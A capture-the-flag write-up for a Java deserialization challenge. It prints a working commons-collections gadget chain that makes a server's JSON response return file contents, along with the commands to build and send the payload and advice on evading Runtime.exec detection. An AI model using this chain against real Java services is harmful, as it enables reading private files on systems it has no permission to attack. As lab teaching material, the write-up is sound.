# java notes

- Category: pwn
- Difficulty: medium

"I heard Java's the hot new language on the block. It's certainly making my CPU hot!"

Filed under pwn, but there is no binary and no memory corruption — it is a Java deserialization gadget-chain challenge. The twist worth writing down is not reaching RCE (commons-collections 3.2.1 on the classpath makes that routine) but avoiding it: the endpoint can be made to hand the flag back in its own JSON response, with no callback host and no blind oracle.

### Solution:

##### 1. `readObject` on attacker bytes, with a known-vulnerable dependency

`pom.xml` pins the classic:

```xml
<dependency>
  <groupId>commons-collections</groupId>
  <artifactId>commons-collections</artifactId>
  <version>3.2.1</version>
</dependency>
```

and `RestoreHandler` feeds it base64 straight from the request body:

```java
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(raw))) {
    Object obj = ois.readObject();   // <-- the bug
    if (obj instanceof Session) {
        send(ex, 200, "application/json", sessionJson((Session) obj).getBytes(UTF_8));
    } else {
        send(ex, 400, "text/plain", "that token is not a session".getBytes(UTF_8));
    }
} catch (Exception e) {
    send(ex, 400, "text/plain",
         ("could not restore session: " + e.getClass().getSimpleName()).getBytes(UTF_8));
}
```

The base image is `eclipse-temurin:11`, so the CC1 chain is out (`AnnotationInvocationHandler` was changed in 8u72) but CC6 works. That gets command execution — and then nothing, because the handler only ever returns an exception's *class name*, so any `Runtime.exec` result has to leave the box some other way.

##### 2. The response renderer is a free `toString()` call

The success path is more useful than the exception path. `sessionJson` walks the notes list:

```java
b.append('"').append(jsonEscape(String.valueOf(s.notes.get(i)))).append('"');
```

`notes` is declared `List<String>`, but generics are erased — the deserialized list can hold *any* object, and `String.valueOf` will call `toString()` on it. So instead of a chain that executes a command, the chain only has to be one whose `toString()` returns the file contents, hung off a genuine `Session` so that `obj instanceof Session` still passes.

`TiedMapEntry.toString()` is the lever:

```java
public String toString() { return getKey() + "=" + getValue(); }
public Object getValue()  { return map.get(key); }
```

Backing it with a `LazyMap` means `get()` on an absent key runs the map's factory and returns the result — which lands straight in the string that gets JSON-encoded into the response.

##### 3. A transformer chain that reads a file instead of spawning a shell

Reading a file needs no `Runtime` at all; `Scanner` with an `\A` delimiter slurps the whole thing, and `java.io.File` is serializable so it can be baked into the payload as a constant:

```java
Transformer chain = new ChainedTransformer(new Transformer[]{
    new ConstantTransformer(Scanner.class),
    new InstantiateTransformer(new Class[]{File.class}, new Object[]{new File(path)}),
    new InvokerTransformer("useDelimiter", new Class[]{String.class}, new Object[]{"\\A"}),
    new InvokerTransformer("next", new Class[0], new Object[0]),
});

Map lazy = LazyMap.decorate(new HashMap(), chain);
List notes = new ArrayList();
notes.add(new TiedMapEntry(lazy, "flag"));

Main.Session s = new Main.Session("pwn", "dark", notes);
```

`ConstantTransformer` seeds the chain with `Scanner.class`, `InstantiateTransformer` requires its input to be a `Class` and calls the matching constructor, and the two `InvokerTransformer`s finish the job on the returned object. Nothing executes during `readObject` here — the chain only fires later, when the response renderer calls `toString()`.

Building the payload needs the server's own `Main$Session` class, since the stream carries its name and `serialVersionUID`. Putting the generator in the same package (`com.k17.javanotes`) makes the package-private nested class and its constructor reachable:

```
javac -nowarn -cp cc.jar:cls -d cls src/com/k17/javanotes/Gen.java
java  -cp cls:cc.jar com.k17.javanotes.Gen /flag.txt > token.txt
```

##### 4. The flag comes back in the JSON

Verified first against the server built from the handout, with the path pointed at a local file, then fired at the instance:

```
$ curl -sS -X POST --data-binary @token.txt https://<instance>/api/restore
{"username":"pwn","theme":"dark","notes":["flag=K17{i_am_java_ONE_with_java!!!!oashd8aghrdfo8aehFIOEASDJFNLC}"]}
```

The `flag=` prefix is `TiedMapEntry`'s key, glued on by its `toString()`.

One useful intermediate signal while building this: a wrong path returns `could not restore session: FunctorException`. That is `InstantiateTransformer` wrapping the `FileNotFoundException` — which means the chain fired correctly and only the filename was wrong. A chain that never triggers fails differently.

Generator: [Gen.java](Gen.java)

**Flag:** `K17{i_am_java_ONE_with_java!!!!oashd8aghrdfo8aehFIOEASDJFNLC}`

### Takeaways

- Reach for exfiltration through the application's own response before reaching for RCE. If any deserialized field is later printed, concatenated or logged, a gadget whose `toString()` returns data is simpler than a command-execution chain and needs no outbound network path from the target.
- `List<String>` is `List` at runtime. A field's declared generic type constrains nothing about what a deserialized object graph may contain, and `String.valueOf` on an arbitrary element is an attacker-controlled `toString()`.
- `InstantiateTransformer` plus any serializable constructor argument (`File`, `URL`, `byte[]`) constructs arbitrary JDK objects without touching `Runtime`, which also keeps the chain clear of the usual `Runtime.exec` detections.
- The exception class name leaking back is enough of an oracle to debug a chain: `FunctorException` means it ran, `ClassNotFoundException` means the gadget library is not on the classpath, `InvalidClassException` means a `serialVersionUID` mismatch.
